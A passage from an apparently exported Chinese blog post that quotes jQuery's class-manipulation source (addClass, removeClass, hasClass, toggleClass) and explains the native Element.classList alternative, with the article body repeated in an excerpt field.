class=\"keyword\">typeof</span> value;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> stateVal === <span class=\"string\">\"boolean\"</span> &amp;&amp; type === <span class=\"string\">\"string\"</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> stateVal ? <span class=\"keyword\">this</span>.addClass( value ) : <span class=\"keyword\">this</span>.removeClass( value );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> i </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).toggleClass(</span><br><span class=\"line\">                value.call( <span class=\"keyword\">this</span>, i, getClass( <span class=\"keyword\">this</span> ), stateVal ),</span><br><span class=\"line\">                stateVal</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> className, i, self, classNames;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( type === <span class=\"string\">\"string\"</span> ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Toggle individual class names</span></span><br><span class=\"line\">            i = <span class=\"number\">0</span>;</span><br><span class=\"line\">            self = jQuery( <span class=\"keyword\">this</span> );</span><br><span class=\"line\">            classNames = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> ( ( className = classNames[ i++ ] ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Check each className given, space separated list</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( self.hasClass( className ) ) &#123;</span><br><span class=\"line\">                    self.removeClass( className );</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    self.addClass( className );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Toggle whole class name</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( value === <span class=\"literal\">undefined</span> || type === <span class=\"string\">\"boolean\"</span> ) &#123;</span><br><span class=\"line\">            className = getClass( <span class=\"keyword\">this</span> );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( className ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Store className if set</span></span><br><span class=\"line\">                dataPriv.set( <span class=\"keyword\">this</span>, <span class=\"string\">\"__className__\"</span>, className );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// If the element has a class name or if we're passed `false`,</span></span><br><span class=\"line\">            <span class=\"comment\">// then remove the whole classname (if there was one, the above saved it).</span></span><br><span class=\"line\">            <span class=\"comment\">// Otherwise bring back whatever was previously saved (if anything),</span></span><br><span class=\"line\">            <span class=\"comment\">// falling back to the empty string if nothing was stored.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.setAttribute ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setAttribute( <span class=\"string\">\"class\"</span>,</span><br><span class=\"line\">                    className || value === <span class=\"literal\">false</span> ?</span><br><span class=\"line\">                    <span class=\"string\">\"\"</span> :</span><br><span class=\"line\">                    dataPriv.get( <span class=\"keyword\">this</span>, <span class=\"string\">\"__className__\"</span> ) || <span class=\"string\">\"\"</span></span><br><span class=\"line\">                );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>内部的代码逻辑我就不再分析了，这种代码最明显的特点：<code>大量的循环和判断</code>。<br>对于以前的前端环境来说，这种写法无可厚非，它能让我们的代码更加的健壮，能兼容几乎所有的浏览器环境了。但是如今，随着 <code>大前端</code> 的兴起，浏览器对于 <code>js - css - html</code> 的支持能力已经发生了翻天覆地的变化，我们可以用最简单、快速的方式实现上面的操作。</p>\n<h3 id=\"Element-classList\"><a href=\"#Element-classList\" class=\"headerlink\" title=\"Element.classList\"></a>Element.classList</h3><p>我们先看下官方对于该属性的介绍：</p>\n<blockquote>\n<p>Element.classList 是一个只读属性，返回一个元素的类属性的实时 DOMTokenList集合。<br>使用 classList 是一个方便的替代方法，通过element.className作为空格分隔的字符串访问元素的类列表。</p>\n</blockquote>\n<p>更加通俗的讲：<br>之前我们获取一个元素类名的集合时，需要先使用 <code>element.className</code> 获取类名的字符串，之后在 <code>split</code> 成一个集合。而使用 <code>element.classList</code> 时，我们能直接获取元素类名的集合(<strong>这里是集合，不是数组</strong>)。</p>\n<h3 id=\"Element-classList-的类名操作\"><a href=\"#Element-classList-的类名操作\" class=\"headerlink\" title=\"Element.classList 的类名操作\"></a>Element.classList 的类名操作</h3><p>上面说到，<code>element.classList</code> 返回一个类名的集合，该集合是与元素的 <code>class</code> 相互映射的。也就是说，我们只要向 <code>classList</code> 中添加一个 <code>class</code> 这个 <code>class</code> 就会映射到真实的元素上。为此<code>DOMTokenList</code> 提供了一套操作的方法来允许开发者操作 <code>classList</code>。</p>\n<h4 id=\"addClass-classList-add\"><a href=\"#addClass-classList-add\" class=\"headerlink\" title=\"addClass - classList.add\"></a>addClass - classList.add</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加类名</span></span><br><span class=\"line\">element.classList.add(<span class=\"string\">'added-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"removeClass-classList-remove\"><a href=\"#removeClass-classList-remove\" class=\"headerlink\" title=\"removeClass - classList.remove\"></a>removeClass - classList.remove</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 删除类名</span></span><br><span class=\"line\">element.classList.remove(<span class=\"string\">'removed-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"hasClass-classList-contains\"><a href=\"#hasClass-classList-contains\" class=\"headerlink\" title=\"hasClass - classList.contains\"></a>hasClass - classList.contains</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断是否存在类名</span></span><br><span class=\"line\">element.classList.contains(<span class=\"string\">'contains-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"toggleClass-classList-toggle\"><a href=\"#toggleClass-classList-toggle\" class=\"headerlink\" title=\"toggleClass - classList.toggle\"></a>toggleClass - classList.toggle</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 类名切换</span></span><br><span class=\"line\">element.classList.toggle(<span class=\"string\">'toggled-class'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 类名切换 - while</span></span><br><span class=\"line\"><span class=\"comment\">// 当第二个参数的表达式满足条件时，执行 toggle 操作</span></span><br><span class=\"line\"><span class=\"comment\">// 该方法目前还在 **实验** 阶段</span></span><br><span class=\"line\">element.classList.toggle(<span class=\"string\">'toggled-class'</span>, i &lt; <span class=\"number\">10</span>)</span><br></pre></td></tr></table></figure>\n<p>上面列举的这些方法已经在 <code>ie10</code> 以上的浏览器上普及，可以直接使用。<br>更多 <code>classList</code> 的方法可以参考<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList\" target=\"_blank\" rel=\"noopener\">这里</a>。</p>\n","site":{"data":{}},"excerpt":"<p>在前端 <code>MV*</code> 框架还未兴起的时期，绝大部分的前端网站都是基于 <code>事件驱动</code> 的。而这种网站总是不可避免的伴随着大量的 <code>DOM操作</code>。其中，<code>类名 - class</code> 的操作算是其中最平常也是最方便、通用的一种。</p>","more":"<h3 id=\"类名操作\"><a href=\"#类名操作\" class=\"headerlink\" title=\"类名操作\"></a>类名操作</h3><p>说起类名操作，大部分人的第一反应就是 <code>jquery</code> 中的 <code>addClass、removeClass、hasClass、toggleClass</code> 这几个组合了。<br>下面我们看下 <code>jquery</code> 源码中是怎么实现的。</p>\n<h4 id=\"addClass\"><a href=\"#addClass\" class=\"headerlink\" title=\"addClass\"></a>addClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// addClass</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addClass</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> j </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).addClass( value.call( <span class=\"keyword\">this</span>, j, getClass( <span class=\"keyword\">this</span> ) ) );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> value === <span class=\"string\">\"string\"</span> &amp;&amp; value ) &#123;</span><br><span class=\"line\">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">            curValue = getClass( elem );</span><br><span class=\"line\">            cur = elem.nodeType === <span class=\"number\">1</span> &amp;&amp; ( <span class=\"string\">\" \"</span> + stripAndCollapse( curValue ) + <span class=\"string\">\" \"</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cur ) &#123;</span><br><span class=\"line\">                j = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ( cur.indexOf( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span> ) &lt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">                        cur += clazz + <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Only assign if different to avoid unneeded rendering.</span></span><br><span class=\"line\">                finalValue = stripAndCollapse( cur );</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( curValue !== finalValue ) &#123;</span><br><span class=\"line\">                    elem.setAttribute( <span class=\"string\">\"class\"</span>, finalValue );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"removeClass\"><a href=\"#removeClass\" class=\"headerlink\" title=\"removeClass\"></a>removeClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// removeClass </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">removeClass</span>(<span class=\"params\"> value </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> j </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).removeClass( value.call( <span class=\"keyword\">this</span>, j, getClass( <span class=\"keyword\">this</span> ) ) );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !<span class=\"built_in\">arguments</span>.length ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.attr( <span class=\"string\">\"class\"</span>, <span class=\"string\">\"\"</span> );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> value === <span class=\"string\">\"string\"</span> &amp;&amp; value ) &#123;</span><br><span class=\"line\">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">            curValue = getClass( elem );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// This expression is here for better compressibility (see addClass)</span></span><br><span class=\"line\">            cur = elem.nodeType === <span class=\"number\">1</span> &amp;&amp; ( <span class=\"string\">\" \"</span> + stripAndCollapse( curValue ) + <span class=\"string\">\" \"</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( cur ) &#123;</span><br><span class=\"line\">                j = <span class=\"number\">0</span>;</span><br><span class=\"line\">                <span class=\"keyword\">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\">// Remove *all* instances</span></span><br><span class=\"line\">                    <span class=\"keyword\">while</span> ( cur.indexOf( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span> ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">                        cur = cur.replace( <span class=\"string\">\" \"</span> + clazz + <span class=\"string\">\" \"</span>, <span class=\"string\">\" \"</span> );</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Only assign if different to avoid unneeded rendering.</span></span><br><span class=\"line\">                finalValue = stripAndCollapse( cur );</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( curValue !== finalValue ) &#123;</span><br><span class=\"line\">                    elem.setAttribute( <span class=\"string\">\"class\"</span>, finalValue );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"hasClass\"><a href=\"#hasClass\" class=\"headerlink\" title=\"hasClass\"></a>hasClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// hasClass</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">hasClass</span>(<span class=\"params\"> selector </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> className, elem,</span><br><span class=\"line\">        i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    className = <span class=\"string\">\" \"</span> + selector + <span class=\"string\">\" \"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( ( elem = <span class=\"keyword\">this</span>[ i++ ] ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( elem.nodeType === <span class=\"number\">1</span> &amp;&amp;</span><br><span class=\"line\">            ( <span class=\"string\">\" \"</span> + stripAndCollapse( getClass( elem ) ) + <span class=\"string\">\" \"</span> ).indexOf( className ) &gt; <span class=\"number\">-1</span> ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"toggleClass\"><a href=\"#toggleClass\" class=\"headerlink\" title=\"toggleClass\"></a>toggleClass</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// toggleClass </span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">toggleClass</span>(<span class=\"params\"> value, stateVal </span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> type = <span class=\"keyword\">typeof</span> value;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">typeof</span> stateVal === <span class=\"string\">\"boolean\"</span> &amp;&amp; type === <span class=\"string\">\"string\"</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> stateVal ? <span class=\"keyword\">this</span>.addClass( value ) : <span class=\"keyword\">this</span>.removeClass( value );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> i </span>) </span>&#123;</span><br><span class=\"line\">            jQuery( <span class=\"keyword\">this</span> ).toggleClass(</span><br><span class=\"line\">                value.call( <span class=\"keyword\">this</span>, i, getClass( <span class=\"keyword\">this</span> ), stateVal ),</span><br><span class=\"line\">                stateVal</span><br><span class=\"line\">            );</span><br><span class=\"line\">        &#125; );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.each( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> className, i, self, classNames;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( type === <span class=\"string\">\"string\"</span> ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Toggle individual class names</span></span><br><span class=\"line\">            i = <span class=\"number\">0</span>;</span><br><span class=\"line\">            self = jQuery( <span class=\"keyword\">this</span> );</span><br><span class=\"line\">            classNames = value.match( rnothtmlwhite ) || [];</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">while</span> ( ( className = classNames[ i++ ] ) ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Check each className given, space separated list</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> ( self.hasClass( className ) ) &#123;</span><br><span class=\"line\">                    self.removeClass( className );</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    self.addClass( className );</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Toggle whole class name</span></span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( value === <span class=\"literal\">undefined</span> || type === <span class=\"string\">\"boolean\"</span> ) &#123;</span><br><span class=\"line\">            className = getClass( <span class=\"keyword\">this</span> );</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( className ) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Store className if set</span></span><br><span class=\"line\">                dataPriv.set( <span class=\"keyword\">this</span>, <span class=\"string\">\"__className__\"</span>, className );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// If the element has a class name or if we're passed `false`,</span></span><br><span class=\"line\">            <span class=\"comment\">// then remove the whole classname (if there was one, the above saved it).</span></span><br><span class=\"line\">            <span class=\"comment\">// Otherwise bring back whatever was previously saved (if anything),</span></span><br><span class=\"line\">            <span class=\"comment\">// falling back to the empty string if nothing was stored.</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( <span class=\"keyword\">this</span>.setAttribute ) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">this</span>.setAttribute( <span class=\"string\">\"class\"</span>,</span><br><span class=\"line\">                    className || value === <span class=\"literal\">false</span> ?</span><br><span class=\"line\">                    <span class=\"string\">\"\"</span> :</span><br><span class=\"line\">                    dataPriv.get( <span class=\"keyword\">this</span>, <span class=\"string\">\"__className__\"</span> ) || <span class=\"string\">\"\"</span></span><br><span class=\"line\">                );</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>内部的代码逻辑我就不再分析了，这种代码最明显的特点：<code>大量的循环和判断</code>。<br>对于以前的前端环境来说，这种写法无可厚非，它能让我们的代码更加的健壮，能兼容几乎所有的浏览器环境了。但是如今，随着 <code>大前端</code> 的兴起，浏览器对于 <code>js - css - html</code> 的支持能力已经发生了翻天覆地的变化，我们可以用最简单、快速的方式实现上面的操作。</p>\n<h3 id=\"Element-classList\"><a href=\"#Element-classList\" class=\"headerlink\" title=\"Element.classList\"></a>Element.classList</h3><p>我们先看下官方对于该属性的介绍：</p>\n<blockquote>\n<p>Element.classList 是一个只读属性，返回一个元素的类属性的实时 DOMTokenList集合。<br>使用 classList 是一个方便的替代方法，通过element.className作为空格分隔的字符串访问元素的类列表。</p>\n</blockquote>\n<p>更加通俗的讲：<br>之前我们获取一个元素类名的集合时，需要先使用 <code>element.className</code> 获取类名的字符串，之后在 <code>split</code> 成一个集合。而使用 <code>element.classList</code> 时，我们能直接获取元素类名的集合(<strong>这里是集合，不是数组</strong>)。</p>\n<h3 id=\"Element-classList-的类名操作\"><a href=\"#Element-classList-的类名操作\" class=\"headerlink\" title=\"Element.classList 的类名操作\"></a>Element.classList 的类名操作</h3><p>上面说到，<code>element.classList</code> 返回一个类名的集合，该集合是与元素的 <code>class</code> 相互映射的。也就是说，我们只要向 <code>classList</code> 中添加一个 <code>class</code> 这个 <code>class</code> 就会映射到真实的元素上。为此<code>DOMTokenList</code> 提供了一套操作的方法来允许开发者操作 <code>classList</code>。</p>\n<h4 id=\"addClass-classList-add\"><a href=\"#addClass-classList-add\" class=\"headerlink\" title=\"addClass - classList.add\"></a>addClass - classList.add</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 添加类名</span></span><br><span class=\"line\">element.classList.add(<span class=\"string\">'added-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"removeClass-classList-remove\"><a href=\"#removeClass-classList-remove\" class=\"headerlink\" title=\"removeClass - classList.remove\"></a>removeClass - classList.remove</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 删除类名</span></span><br><span class=\"line\">element.classList.remove(<span class=\"string\">'removed-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"hasClass-classList-contains\"><a href=\"#hasClass-classList-contains\" class=\"headerlink\" title=\"hasClass - classList.contains\"></a>hasClass - classList.contains</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 判断是否存在类名</span></span><br><span class=\"line\">element.classList.contains(<span class=\"string\">'contains-class'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"toggleClass-classList-toggle\"><a href=\"#toggleClass-classList-toggle\" class=\"headerlink\" title=\"toggleClass - classList.toggle\"></a>toggleClass - classList.toggle</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 